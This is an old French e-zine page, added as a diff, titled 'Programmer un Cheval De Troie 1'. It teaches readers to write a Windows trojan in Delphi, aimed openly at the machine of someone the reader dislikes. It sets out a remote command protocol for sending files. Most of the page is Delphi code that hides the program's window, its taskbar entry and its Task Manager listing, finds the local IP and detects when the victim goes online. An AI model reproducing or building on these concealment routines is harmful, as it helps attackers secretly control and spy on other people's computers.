@@ -1,0 +1,168 @@
+<HTML>
+<BODY BGCOLOR=#FFFFFF TEXT=#000000 LINK=#0000B0 VLINK=#4040FF>
+<FONT FACE="Arial">
+<P ALIGN=RIGHT>
+<I><FONT SIZE=2>Luttons <A HREF="http://www.altern.org">pour Altern.org</A> et <A HREF="Estelle.html">contre Estelle Halliday</A></FONT></I><P><P>
+
+<CENTER>
+<FONT FACE="Comic sans ms" Size=6 Color=#202020><B>Programmer un Cheval De Troie <I>1</I></B></FONT><BR>
+(Par <A HREF="mailto:le_magicien@hempseed.com">Le_Magicien</A> pour <A HREF="http://galaad.deserens.org">Galaad</A>)<P>
+</CENTER>
+
+<FONT Size=5 Color=#2020FF><B>Intro&nbsp;:</B></A><P>
+</FONT>
+&nbsp;&nbsp;&nbsp;&nbsp;Nous allons ici nous int&eacute;resser &agrave; la programmation de Chevaux De Troie (CDT) en Delphi sous Windows.<BR>
+<BR><I>Pourquoi sous Windows&nbsp;?</I><BR>
+Ben, si vous posez cette question, c'est que vous n'avez pas bien compris ce qu'est un CDT. Je vous renvoie donc &agrave; l'article de CyberBobJr. Pour ceux qui sont press&eacute;s, je dirai juste qu'un CDT est fait pour tourner sur la machine d'un naze que vous n'aimez pas. Et par d&eacute;finition, une "machine d'un naze que vous n'aimez pas" tourne sous Windows. Il va donc falloir vous y faire, un bon CDT doit &ecirc;tre programm&eacute; pour Windows.<BR>
+<BR><I>Pourquoi en Delphi&nbsp;?</I><BR>
+Pasque&nbsp;!<P>
+
+<FONT Size=5 Color=#2020FF><B>1)&nbsp;Le mat&eacute;riel de base&nbsp;:</B></A><P>
+</FONT>
+&nbsp;&nbsp;&nbsp;&nbsp;Votre CDT sera destin&eacute; &agrave; fonctionner sur un r&eacute;seau TCP/IP (sisi, j'vous le jure). il vous faut donc un composant TCP/IP. Il en existe un fourni avec Delphi III et plus, mais en version serveur, il ne fonctionne que sur les ordis où Delphi est install&eacute; (ceux qui sont cens&eacutes avoir pay&eacute; leur license). Je vous d&eacute;conseille donc d'utiliser ce composant, au profit d'un autre, totalement gratuit, et dont les sources sont disponibles (tiens tiens, &ccedil;a me rappelle quelque chose ;-) &eacute;crit par un Belge : Fran&ccedil;ois Piette, et que vous pourrez t&eacute;l&eacute;charger sur son <A HREF="http://www.rtfm.be/fpiette">site</A>.<BR>
+Je ne d&eacute;crirai pas dans ce document la programmation de ce composant. Si vous me le <A HREF="mailto:le_magicien@hempseed.com">demandez</A>, cel&agrave; sera fait dans le prochain num&eacute;ro de <B>AlTeRnAtIvE</B>.
+<P>
+
+<FONT Size=5 Color=#2020FF><B>2)&nbsp;Pr&eacute;voir la communication entre le Client et le Serveur&nbsp;:</B></A><P>
+</FONT>
+&nbsp;&nbsp;&nbsp;&nbsp;Je vous conseille de d&eacute;velopper conjointement la partie Client et la partie Serveur, ce qui vous permettra de v&eacute;rifier au cours du d&eacute;veloppement la validit&eacute; de votre programme. Je vous conseille aussi de pr&eacute;voir d&egrave;s le d&eacute;but un syst&egrave;me de communication Client/Serveur assez blind&eacute; afin de pr&eacute;voir  un bordel qui pourrait s'installer dans vos sources et toute &eacute;volution lors de prochaines versions. Voici un sch&eacute;ma qui pourrait marcher&nbsp;:<P>
+<FONT FACE="courier">
+Commencer toute commande par le caractère "%".<BR>
+Le faire suivre d'un num&eacute;ro de commande compos&eacute; de la mani&egrave;re suivante&nbsp;:<BR>
+2 chiffres d&eacute;crivant le groupe dans lequel se situe la commande.<BR>
+1 chiffre d&eacute;crivant l'action &agrave; accomplir.<BR>
+Puis les options de la commande.<BR>
+Enfin, un commentaire (pr&eacutec&eacute;d&eacute; d'un caract&egrave;re sp&eacute;cial) sur le reste de la ligne, que le programme n'examinera pas, mais qui vous permettra de mieux vous y retrouver, et &eacute;ventuellement de piloter un serveur par Telnet depuis un poste o&ugrave; votre client n'est pas install&eacute; (dans un CyberCaf&eacute; par exemple).<P>
+<B>Exemple</B>&nbsp;:<BR>
+%150 toto.txt #Envoi de fichier<P>
+O&ugrave; 15 est le groupe d'actions sur l'envoi de fichiers, et 0 l'action de commencer un t&eacute;l&eacute;chargement. Dans le m&ecirc;me registre, on pourrait pr&eacute;voir d'autres actions&nbsp;:<BR>
+1 : Reprendre un t&eacute;l&eacute;chargement.<BR>
+2 : V&eacute;rifier l'int&eacute;gralit&eacute; d'un fichier t&eacute;l&eacute;charg&eacute;.<BR>
+3 : Finir un t&eacute;l&eacute;chargement.
+</FONT>
+<P>
+
+<FONT Size=5 Color=#2020FF><B>3)&nbsp;Routines utiles &agrave; la programmation d'un CDT&nbsp;:</B></A><P>
+</FONT>
+<FONT SIZE=4 Color=#202080>a)<I>&nbsp;Cacher la fen&ecirc;tre de l'&eacute;cran&nbsp;:</I></FONT><P>
+L'id&eacute;e est simple : r&eacute;duire la fen&ecirc;tre &agrave; un carr&eacute; de 0*0 pixels&nbsp:<P>
+<FONT FACE="courier new" COLOR=#000000 Size=2>
+<B>Var</B><BR>
+&nbsp;&nbsp;&nbsp;TmpWidth, TmpHeight : Integer;<BR>
+&nbsp;&nbsp;&nbsp;Bordures: TFormBorderStyle;<BR>
+<BR>
+<B>Procedure</B> CacheFen (Formz : TForm);<BR>
+<B>Begin</B><BR>
+&nbsp;&nbsp;&nbsp;Bordures := Formz.BorderStyle;<BR>
+&nbsp;&nbsp;&nbsp;Formz.BorderStyle := bsNone;<BR>
+&nbsp;&nbsp;&nbsp;TmpWidth := Formz.Width;<BR>
+&nbsp;&nbsp;&nbsp;TmpHeight := Formz.Height;<BR>
+&nbsp;&nbsp;&nbsp;Formz.Width := 0;<BR>
+&nbsp;&nbsp;&nbsp;Formz.Height := 0;<BR>
+<B>End;</B><BR>
+<BR>
+<B>Procedure</B> MontreFen (Formz : TForm);<BR>
+<B>Begin</B><BR>
+&nbsp;&nbsp;&nbsp;Formz.BorderStyle := Bordures;<BR>
+&nbsp;&nbsp;&nbsp;Formz.Width := TmpWidth;<BR>
+&nbsp;&nbsp;&nbsp;Formz.Height := TmpHeight;<BR>
+<B>End;</B>
+</FONT>
+<P>
+<FONT SIZE=4 Color=#202080>b)<I>&nbsp;Cacher l'application de la barre des t&acirc;ches&nbsp;:</I></FONT><P>
+Juste un cht'it appel aux APIs de Windows.<P>
+<FONT FACE="courier new" COLOR=#000000 SIZE=2>
+<B>Procedure</B> CacheBarre;<BR>
+<B>Begin</B><BR>
+&nbsp;&nbsp;&nbsp;ShowWindow(Application.Handle, SW_HIDE);<BR>
+<B>End;</B>
+</FONT>
+<P>
+<FONT SIZE=4 Color=#202080>c)&nbsp;<I>Cacher le programme de la liste des t&acirc;ches (CTRL+ATL+SUPPR)&nbsp;:</I></FONT><P>
+<FONT FACE="courier new" SIZE=2 COLOR=#000000>
+<B>Procedure</B> CacheApp;<BR>
+<B>Begin</B><BR>
+&nbsp;&nbsp;&nbsp;RegisterServiceProcess (GetCurrentProcessId, 1);<BR>
+<B>End;</B><BR>
+<BR>
+<B>Procedure</B> MontreApp;<BR>
+<B>Begin</B><BR>
+&nbsp;&nbsp;&nbsp;RegisterServiceProcess (GetCurrentProcessId, 0);<BR>
+<B>End;</B>
+</FONT><P>
+Et oui, c'est aussi court. La technique consiste ici &agrave; faire croire &agrave; Windows que le programme en question est un driver... (c'qu'il se laisse facilement berner, le Windows ;-)
+<P>
+
+<FONT SIZE=4 Color="#202080">d)<I>&nbsp;Obtenir l'adresse IP de l'ordinateur local&nbsp;:</I></FONT><P>
+<FONT FACE="courier new" SIZE=2 COLOR="#000000">
+<B>Function</B> LocalIP : <B>String</B>;<BR>
+<FONT COLOR="#000080">{Renvoie l'adresse IP locale.<BR>
+Si connecté à aucun réseau, renvoie 127.0.0.1}</FONT><BR>
+<BR>
+Type<BR>
+&nbsp;&nbsp;&nbsp;TaPInAddr = <B>array</B> [0..10] <B>of</B> PInAddr;<BR>
+&nbsp;&nbsp;&nbsp;PaPInAddr = ^TaPInAddr;<BR>
+<B>Var</B><BR>
+&nbsp;&nbsp;&nbsp;phe&nbsp;: PHostEnt;<BR>
+&nbsp;&nbsp;&nbsp;pptr&nbsp;: PaPInAddr;<BR>
+&nbsp;&nbsp;&nbsp;Buffer&nbsp;: <B>array</B> [0..63] <B>of</B> char;<BR>
+&nbsp;&nbsp;&nbsp;I&nbsp;: Integer;<BR>
+&nbsp;&nbsp;&nbsp;GInitData&nbsp;: TWSADATA;<BR>
+<B>Begin</B><BR>
+<FONT COLOR="#000080">{Démarrage des Sockets Windows}</FONT><BR>
+&nbsp;&nbsp;&nbsp;WSAStartup($101, GInitData);<BR>
+&nbsp;&nbsp;&nbsp;Result := '';<BR>
+<FONT COLOR="#000080">{Obtenir le nom de l'ordinateur local}</FONT><BR>
+&nbsp;&nbsp;&nbsp;GetHostName(Buffer, SizeOf(Buffer));<BR>
+&nbsp;&nbsp;&nbsp;phe :=GetHostByName(buffer);<BR>
+&nbsp;&nbsp;&nbsp;<B>if</B> phe = <B>nil then</B> Exit;<BR>
+<FONT COLOR="#000080">{Transformer ce nom en adresse IP}</FONT><BR>
+&nbsp;&nbsp;&nbsp;pptr := PaPInAddr(Phe^.h_addr_list);<BR>
+&nbsp;&nbsp;&nbsp;I := 0;<BR>
+&nbsp;&nbsp;&nbsp;<B>While</B> pptr^[I] <> <B>nil do<BR>
+&nbsp;&nbsp;&nbsp;Begin</B><BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result:=StrPas(inet_ntoa(pptr^[I]^));<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Inc(I);<BR>
+&nbsp;&nbsp;&nbsp;<B>End;</B><BR>
+<FONT COLOR="#000080">{Fin de l'utilisation des Sockets Windows}</FONT><BR>
+&nbsp;&nbsp;&nbsp;WSACleanup;<BR>
+<B>End;</B>
+</FONT><P>
+
+<FONT SIZE=4 Color=#202080>e)<I>&nbsp;Enfin, comment d&eacute;terminer si l'ordi est connect&eacute; sur le net&nbsp;:</I></FONT><P>
+<FONT FACE="courier new" COLOR=#000000 SIZE=2>
+<B>Function</B> IsConnected : Boolean;<BR>
+<BR>
+<B>Var</B><BR>
+&nbsp;&nbsp;&nbsp;Registre : TRegistry;<BR>
+&nbsp;&nbsp;&nbsp;Buffer : <B>Array</B> [0..10] <B>Of</B> Byte;<BR>
+<BR>
+<B>Begin</B><BR>
+&nbsp;&nbsp;&nbsp;Registre := TRegistry.Create;<BR>
+&nbsp;&nbsp;&nbsp;<B>Try</B><BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IsConnected := False;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Registre.RootKey := HKEY_LOCAL_MACHINE;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<B>If</B>&nbsp;Registre.OpenKey&nbsp;('System\CurrentControlSet\Services\RemoteAccess',&nbsp;False)&nbsp;<B>Then</B><BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<B>If</B> Registre.ValueExists ('Remote Connection') <B>Then</B><BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<B>Begin</B><BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Buffer [0] := 0;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Registre.ReadBinaryData ('Remote Connection', Buffer, 10);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<B>If</B> Buffer [0] <> 0 <B>Then</B><BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IsConnected := True;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<B>End;</B><BR>
+<BR>
+&nbsp;&nbsp;&nbsp;<B>Finally</B><BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Registre.CloseKey;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Registre.Free;<BR>
+&nbsp;&nbsp;&nbsp;<B>End;</B><BR>
+<B>End;</B>
+</FONT>
+<P>
+Pour d&eacute;tecter automatiquement le d&eacute;but d'une connexion, il suffit alors de lancer &agrave; intervalles r&eacute;guliers cette fonction gr&acirc;ce &agrave; une horloge. C'est comme &ccedil;a que fonctionnent ICQ ou encore GetRight.
+
+<P>
+Vous aurez d'autres informations, et les r&eacute;ponses &agrave; <A HREF="mailto:le_magicien@hempseed.com">vos questions</A> dans le prochain <B>AlTeRnAtIvE</B>.
+<P><P>
+<I><FONT SIZE=2>Luttons <A HREF="http://www.altern.org">pour Altern.org</A> et <A HREF="Estelle.html">contre Estelle Halliday</A></FONT></I><P>
+<FONT>
+</HTML>
